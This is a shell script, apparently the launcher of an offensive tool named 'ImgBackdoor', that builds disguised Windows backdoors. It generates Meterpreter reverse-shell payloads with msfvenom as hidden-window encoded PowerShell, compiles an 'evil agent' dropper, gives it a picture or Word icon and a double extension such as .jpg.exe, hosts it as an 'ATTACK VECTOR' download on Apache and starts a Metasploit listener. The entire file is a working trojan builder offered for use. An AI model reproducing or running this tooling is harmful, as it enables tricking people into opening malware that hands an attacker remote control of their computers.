#!/bin/sh
resize -s 22 92 > /dev/null


Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}

VeR="1.0"
ken="kennedy69"
ArCh=`arch`
IPATH=`pwd`
HoME=`echo ~`
CnA="Metamorphosis"
DiStR0=`awk '{print $1}' /etc/issue`
InT3R=`netstat -r | grep "default" | awk {'print $8'}`
HkLm=`cat $HoME/.wine/system.reg | egrep -m 1 'ProductName' | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1 # wine windows version


bYR=`cat $IPATH/settings | egrep -m 1 "BYPASS_RH" | cut -d '=' -f2` > /dev/null 2>&1
EtU=`cat $IPATH/settings | egrep -m 1 "PICTURE_EXTENSION" | cut -d '=' -f2` > /dev/null 2>&1
PaLe=`cat $IPATH/settings | egrep -m 1 "PAYLOAD_EXTENSION" | cut -d '=' -f2` > /dev/null 2>&1
ApAc=`cat $IPATH/settings | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1
NoMsF=`cat $IPATH/settings | egrep -m 1 "NON_MSF_PAYLOADS" | cut -d '=' -f2` > /dev/null 2>&1
AuTo=`cat $IPATH/settings | egrep -m 1 "AUTO_PAYLOAD_BUILD" | cut -d '=' -f2` > /dev/null 2>&1
AhPu=`cat $IPATH/settings | egrep -m 1 "AGENT_HANDLER_PORT" | cut -d '=' -f2` > /dev/null 2>&1
FwDc=`cat $IPATH/settings | egrep -m 1 "FAKE_WORD_DOC" | cut -d '=' -f2` > /dev/null 2>&1
PuIa=`cat $IPATH/settings | egrep -m 1 "USE_PUBLIC_IP" | cut -d '=' -f2` > /dev/null 2>&1
PuiB=`cat $IPATH/settings | egrep -m 1 "EXTERNAL_IP" | cut -d '=' -f2` > /dev/null 2>&1
ChEk=`cat $IPATH/settings | egrep -m 1 "MSF_REBUILD" | cut -d '=' -f2` > /dev/null 2>&1

if [ "$ArCh" = "i386" ] || [ "$ArCh" = "i686" ]; then
  dEd="x86"
  arch="wine"
  PgFi="Program Files"
  ComP="i586-mingw32msvc-gcc"
elif [ "$ArCh" = "x86_64" ] || [ "ArCh" = "amd64" ]; then
  dEd="x64"
  arch="wine64"
  PgFi="Program Files (x86)" # default value
  ComP="i686-w64-mingw32-gcc"
else
  dEd="x86"
  arch="wine"
  PgFi="Program Files"
  ComP="i586-mingw32msvc-gcc"
fi
RhI="$HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe"



case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Mint) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | awk {'print $1'}`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="Input your IP" --text "example: 192.168.0.1" --entry --width 300`;;
  esac
clear

if [ "$PuIa" = "YES" ]; then
IP="$PuiB"
fi

Colors;
echo ${BlueF}[☆]${white} Checking backend applications ..${Reset};
sleep 1
apc=`which $ComP`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedF}[x]${white} mingw32[64] installation '->' not found!${Reset};
  sleep 1
  echo ${RedF}[x]${white} This script requires mingw32[64] to work${Reset};
  echo ${YellowF}[☆] Please wait: installing missing dependencies ..${Reset};
    if [ "$dEd" = "x86" ]; then
      echo ""
      sudo apt-get install mingw32
      echo ""
    else
      echo ""
      sudo dpkg --add-architecture i386 && apt-get update && apt-get -y dist-upgrade --allow-downgrades && apt-get install -y mingw32 i586-mingw32msvc-gcc mingw-w64 i686-w64-mingw32-gcc
      echo ""
    fi
else
  echo ${BlueF}[✔️]${white}" mingw32 installation : ${GreenF}found!"${Reset};
  sleep 1
fi

apc=`which wine`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedF}[x]${white} Wine installation '->' not found!${Reset};
  sleep 1
  echo ${RedF}[x]${white} This script requires wine to work${Reset};
  echo ${YellowF}[☆] Please wait: installing missing dependencies ..${Reset};
  echo ""
  sudo apt-get install wine
  echo ""
else
  echo ${BlueF}[✔️]${white}" Wine installation    : ${GreenF}found!"${Reset};
  sleep 1
fi

apc=`which xterm`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedF}[x]${white} Xterm installation '->' not found!${Reset};
  sleep 1
  echo ${RedF}[x]${white} This script requires xterm to work!${Reset};
  echo ${YellowF}[☆] Please wait: installing missing dependencies ..${Reset};
  echo ""
  sudo apt-get install xterm
  echo ""
else
  echo ${BlueF}[✔️]${white}" Xterm installation   : ${GreenF}found!"${Reset};
  sleep 1
fi

apc=`which zenity`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedF}[x]${white} Zenity installation '->' not found!${Reset};
  sleep 1
  echo ${RedF}[x]${white} This script requires Zenity to work!${Reset};
  echo ${YellowF}[☆] Please wait: installing missing dependencies ..${Reset};
  echo ""
  sudo apt-get install zenity
  echo ""
else
  echo ${BlueF}[✔️]${white}" Zenity installation  : ${GreenF}found!"${Reset};
  sleep 1
fi

if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
  echo ${BlueF}[☆]${white}" Wine $PgFi   : ${GreenF}found!"${Reset};
  sleep 1
else
  FaIl="YES"
  echo ${RedF}[x]${white} Wine: $PgFi '->' not found!${Reset};
  sleep 2
  echo ${GreenF}[☆]${white} Please wait, trying to build required folders ..!${Reset};
  winecfg > /dev/null 2>&1
  echo ""
  echo ${RedF}Listing drive_c directorys: ${Reset};
  ls $HoME/.wine/drive_c
  echo ""
fi


if [ "$FaIl" = "YES" ]; then
  sleep 3
  echo ${YellowF}[☆] ImgBackdoor needs to restart to finish installs ..${Reset};
  sleep 2
  exit
fi


if ! [ "$HkLm" = "Microsoft Windows 7" ]; then
  echo ${RedF}[x]${white} Wine system detected : ${RedF}$HkLm ${Reset};
  echo ${RedF}[x]${white} ImgBackdoor requires: ${GreenF}windows 7${white} version ..${Reset};
  echo ${YellowF}[☆] Starting winecfg, Please sellect required version ..${Reset};
  sleep 1
  winecfg > /dev/null 2>&1
fi


clear
cat << !

    ▜▘       ▛▀▖      ▌    ▌         
    ▐ ▛▚▀▖▞▀▌▙▄▘▝▀▖▞▀▖▌▗▘▞▀▌▞▀▖▞▀▖▙▀▖
    ▐ ▌▐ ▌▚▄▌▌ ▌▞▀▌▌ ▖▛▚ ▌ ▌▌ ▌▌ ▌▌  
    ▀▘▘▝ ▘▗▄▘▀▀ ▝▀▘▝▀ ▘ ▘▝▀▘▝▀ ▝▀ ▘  $VeR
    Coded by: $ken

    Extension sellected: .$EtU (picture)
    Extension sellected: .$PaLe (payload)
   'Edit setting file to select extention'

!
rUn=$(zenity --question --title="Image Backdoor" --text "Execute framework?" --width 270) > /dev/null 2>&1
if [ "$PaLe" = "exe" ] && [ "$AuTo" = "YES" ]; then
  echo ${RedF}[x]${YellowF} "[settings] AUTO_PAYLOAD_BUILD=${RedF}$AuTo${YellowF} and PAYLOAD_EXTENSION=${RedF}$PaLe"${Reset};
  sleep 2
  echo ${RedF}[x]${YellowF} "Can ${RedF}NOT${YellowF} be used simultaneously, AUTO_PAYLOAD_BUILD does not build .exe binarys."${Reset};
  exit
fi

  if [ "$?" -eq "0" ]; then
    service apache2 start | zenity --progress --pulsate --title "PLEASE WAIT" --text="Start apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    if ! [ "$NoMsF" = "YES" ]; then
    service postgresql start | zenity --progress --pulsate --title "PLEASE WAIT" --text="Start Metasploit services" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
      if [ "$ChEk" = "ON" ]; then
        service postgresql start
        echo ${BlueF}[☆]${white}" Checking msfdb connection status .."${Reset};
        ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`
          if [ "$ih" != "connected" ]; then
            echo ${RedF}[x]${white}" postgresql selected, no connection .."${Reset};
            echo ${BlueF}[☆]${white}" Please wait, rebuilding msf database .."${Reset};
            msfdb reinit | zenity --progress --pulsate --title "PLEASE WAIT" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
            echo ${GreenF}[✔]${white}" postgresql connected to msf .."${Reset};
            sleep 2
          else
            echo ${GreenF}[✔]${white}" postgresql connected to msf .."${Reset};
            sleep 2
          fi
      fi
    fi

  else

    clear
    echo ""
    echo ${white}    Codename${RedF}::${white}$CnA ${Reset};
    echo ${white}    Maintener${RedF}::${white}$ken ${RedF}::${white}[Ferdi S Kennedy]${Reset};
    echo ""
    service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    if ! [ "$NoMsF" = "YES" ]; then
    service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    fi
    exit
  fi


if [ "$AuTo" = "YES" ]; then
  paylo=$(zenity --list --title "AUTO-BUILD PAYLOAD" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 300) > /dev/null 2>&1
  xterm -T " ImgBackdoor - build payload: .$PaLe " -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$IP LPORT=$AhPu -f psh-cmd -o $IPATH/output/chars.raw" > /dev/null 2>&1
  cd $IPATH/output
  str0=`cat chars.raw | awk {'print $12'}`
  echo "pOwErShElL -noP -wIN 1 -nOnI -eN Sh33L" > payload.raw
  sed "s|Sh33L|$str0|" payload.raw > payload.$PaLe
  rm payload.raw > /dev/null 2>&1
  rm chars.raw > /dev/null 2>&1
  cd $IPATH
else
UpL=$(zenity --title "PAYLOAD TO BE TRANSFORMED (only .$PaLe)" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1
fi
sleep 1
JpG=$(zenity --title "IMAGE TO BE USED (only .$EtU)" --filename=$IPATH --file-selection --text "chose image to use.") > /dev/null 2>&1
sleep 1

if [ "$FwDc" = "YES" ]; then
PaTh="$IPATH/icons/Microsoft-Word.ico"
else
  if [ "$EtU" = "jpg" ]; then
  IcOn=$(zenity --list --title "ICON REPLACEMENT" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPG-black.ico" FALSE "JPG-white.ico" FALSE "JPG-green.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
  elif [ "$EtU" = "jpeg" ]; then
  IcOn=$(zenity --list --title "ICON REPLACEMENT " --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPEG-black.ico" FALSE "JPEG-white.ico" FALSE "JPEG-orange.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
  elif [ "$EtU" = "png" ]; then
  IcOn=$(zenity --list --title "ICON REPLACEMENT" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "PNG-black.ico" FALSE "PNG-white.ico" FALSE "PNG-simple.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
  else
  IcOn=$(zenity --list --title "ICON REPLACEMENT" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPG-Ios7.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
  fi
  if [ "$IcOn" = "Input your own icon" ]; then
    ImR=$(zenity --title "ICON REPLACEMENT" --filename=$IPATH --file-selection --text "chose icon.ico to use") > /dev/null 2>&1
    PaTh="$ImR"
  else
    PaTh="$IPATH/icons/$IcOn"
  fi
fi
sleep 1
MiP=$(zenity --title "PAYLOAD FINAL NAME" --text "example: screenshot" --entry --width 300) > /dev/null 2>&1
clear
cat << !

    ▜▘       ▛▀▖      ▌    ▌         
    ▐ ▛▚▀▖▞▀▌▙▄▘▝▀▖▞▀▖▌▗▘▞▀▌▞▀▖▞▀▖▙▀▖
    ▐ ▌▐ ▌▚▄▌▌ ▌▞▀▌▌ ▖▛▚ ▌ ▌▌ ▌▌ ▌▌  
    ▀▘▘▝ ▘▗▄▘▀▀ ▝▀▘▝▀ ▘ ▘▝▀▘▝▀ ▝▀ ▘  $VeR
    Coded by: $ken

!
cd $IPATH/bin
echo ${BlueF}[☆]${white} Building : evil agent ..${Reset};
  if [ "$PaLe" = "exe" ]; then
    sed "s|LhOsT|$IP|g" evil2.c > evilcopy.c
    sed -i "s|ScRee|$MiP.$EtU|g" evilcopy.c
    sed -i "s|EhLh|$PaLe|g" evilcopy.c
    sleep 2
  else
    sed "s|LhOsT|$IP|g" evil.c > evilcopy.c
    sed -i "s|ScRee|$MiP.$EtU|g" evilcopy.c
    sed -i "s|EhLh|$PaLe|g" evilcopy.c
    sleep 2
  fi

echo ${BlueF}[☆]${white} Compiling: agent using mingw32 ..${Reset};
sleep 2
$ComP evilcopy.c -o trigger.exe -lws2_32 -mwindows
mv trigger.exe $IPATH/output/trigger.exe > /dev/null 2>&1
cd $IPATH

if [ "$bYR" = "YES" ]; then
  echo ${YellowF}[☆]${white} Manually change icon.ico sellected ..${Reset};
  echo ${YellowF}[☆]${white} Use your favorite editor to change icon [trigger.exe]${Reset};
  echo ${YellowF}[☆] When finish, press any key to Continue ..${Reset};
  read op
  mv $IPATH/output/trigger.exe $IPATH/output/agent.exe > /dev/null 2>&1

else
  if [ -f "$RhI" ]; then
    echo ${BlueF}[☆]${white} ResourceHacker.exe: found ..${Reset};
    sleep 1
    echo ${BlueF}[☆]${white} Working: In backdoor agent ..${Reset};
    $arch "$RhI" -open "$IPATH/output/trigger.exe" -save "$IPATH/output/agent.exe" -action addskip -res "$PaTh" -mask ICONGROUP,MAINICON,
    echo ${BlueF}[☆]${white} Change : backdoor agent icons ..${Reset};
    sleep 1

  else
    echo ${RedF}[x]${white} ResourceHacker.exe '->' not found!${Reset};
    sleep 1
cat << !

    Installing ResourceHacker under .wine directorys ..
    Version:$HkLm Arch:$ArCh Folder:$PgFi
    PATH:$RhI

!
    sleep 3
    xterm -T "ImgBackdoor" -geometry 90x26 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
    echo ${YellowF}[☆] Please wait, restarting tool ..${Reset};
    echo ${YellowF}[☆] For proper ResourceHacker.exe Instalation!${Reset};
    sleep 2
    exit

  fi
fi


  echo ${BlueF}[☆]${white} Change : backdoor agent extension ..${Reset};
  mv $IPATH/output/agent.exe  $IPATH/output/$MiP.$EtU.exe > /dev/null 2>&1
  sleep 2

    echo ${BlueF}[☆]${white} Port: all files to apache2 webserver ..${Reset};
      if [ "$AuTo" = "YES" ]; then
        cp $IPATH/output/payload.$PaLe $ApAc/payload.$PaLe > /dev/null 2>&1
      else      
        cp $UpL $ApAc/payload.$PaLe > /dev/null 2>&1
      fi

    cp $JpG $ApAc/$MiP.$EtU > /dev/null 2>&1
    sleep 2
    echo ${BlueF}[☆]${white} Creating: archive $MiP.zip ..${Reset};
    cd $IPATH/output
    if [ "$FwDc" = "YES" ]; then
      mv $MiP.$EtU.exe $MiP.docx.exe > /dev/null 2>&1
      zip $MiP.zip $MiP.docx.exe > /dev/null 2>&1
      mv $MiP.zip $ApAc/$MiP.zip > /dev/null 2>&1
    else
      zip $MiP.zip $MiP.$EtU.exe > /dev/null 2>&1
      mv $MiP.zip $ApAc/$MiP.zip > /dev/null 2>&1
    fi
    cd $IPATH
    sleep 2

    if [ "$NoMsF" = "YES" ]; then
      echo ${BlueF}[☆]${white} Metamorphosis: completed ..${Reset};
      sleep 2
      echo ${YellowF}[☆] Start your own handler now '(listener)' ..${Reset};
      sleep 2
      rm $IPATH/bin/evilcopy.c > /dev/null 2>&1
      rm $IPATH/output/trigger.exe > /dev/null 2>&1
      echo ""
      echo ${RedF}"    ATTACK VECTOR: http://$IP/$MiP.zip"${Reset};
      echo ${RedF}"    AGENT: $IPATH/output/$MiP.$EtU.exe"${Reset};
      echo ""
      sleep 1
      echo ${YellowF}[☆] When finish, press any key to Exit ImgBackdoor ..${Reset};
      read op

    else

      echo ${BlueF}[☆]${white} Creating: resource cleaner.rc ..${Reset};
      sleep 2
      cd $IPATH/bin
      if [ "$PaLe" = "exe" ]; then
        sed "s|RffR|$PaLe|g" cleaner2.rc > copy.rc
        sed -i "s|FaaF|$MiP|g" copy.rc
        sed -i "s|AssA|$EtU|g" copy.rc
        mv copy.rc $IPATH/output/cleaner.rc > /dev/null 2>&1
        cd $IPATH
      else
        sed "s|FaaF|$MiP|g" cleaner.rc > copy.rc
        sed -i "s|AssA|$EtU|g" copy.rc
        mv copy.rc $IPATH/output/cleaner.rc > /dev/null 2>&1
        cd $IPATH
      fi
        echo ${BlueF}[☆]${white} Metamorphosis: completed ..${Reset};
        rm $IPATH/output/trigger.exe > /dev/null 2>&1
        sleep 2
          if [ "$AuTo" = "YES" ]; then
            lhost="$IP"
            lport="$AhPu"
          else
            lhost=$(zenity --title="Enter binary.exe LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
            lport=$(zenity --title="Enter binary.exe LPORT" --text "example: $AhPu" --entry --width 300) > /dev/null 2>&1
            paylo=$(zenity --list --title "ImgBackdoor" --text "\nChose payload used by binary.exe:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
          fi
          echo ""
          echo ${RedF}"    ATTACK VECTOR: http://$IP/$MiP.zip"${Reset};
            if [ "$FwDc" = "YES" ]; then
              echo ${RedF}"    AGENT: $IPATH/output/$MiP.docx.exe"${Reset};
            else
              echo ${RedF}"    AGENT: $IPATH/output/$MiP.$EtU.exe"${Reset};
            fi
          echo ${RedF}"    CLEAN: meterpreter > resource $IPATH/output/cleaner.rc"${Reset};
          sleep 1
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
    fi
      rm $ApAc/$MiP.$EtU > /dev/null 2>&1
      rm $ApAc/$MiP.zip > /dev/null 2>&1
      rm $ApAc/payload.$PaLe > /dev/null 2>&1
      rm $ApAc/$MiP.$EtU.exe > /dev/null 2>&1
      rm $IPATH/bin/evilcopy.c > /dev/null 2>&1
      rm $IPATH/output/trigger.exe > /dev/null 2>&1
      sleep 2
    echo ""
    echo ${white}    Codename${RedF}::${white}$CnA ${Reset};
    echo ${white}    Author${RedF}::${white}$ken ${RedF}::${white}[Ferdi S Kennedy]${Reset};
    sleep 1
    service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    if ! [ "$NoMsF" = "YES" ]; then
    service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    fi
exit
